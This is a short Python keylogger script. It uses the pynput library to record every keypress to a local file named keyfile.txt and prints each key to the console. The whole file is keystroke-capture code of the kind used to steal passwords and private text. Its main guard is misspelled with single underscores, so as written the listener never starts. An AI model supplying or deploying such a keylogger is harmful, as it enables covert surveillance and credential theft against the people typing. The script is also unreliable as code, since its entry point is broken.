from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            # Handle regular character keys
            char = key.char
            logKey.write(char)
        except AttributeError:
            # Handle special keys (e.g., spacebar, shift, etc.)
            if key == keyboard.Key.space:
                logKey.write(" ")  # Write a space when spacebar is pressed
            else:
                # Log the name of the special key (optional)
                logKey.write(f"[{key}]")

if _name_ == "_main_":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()  # Keep the program running
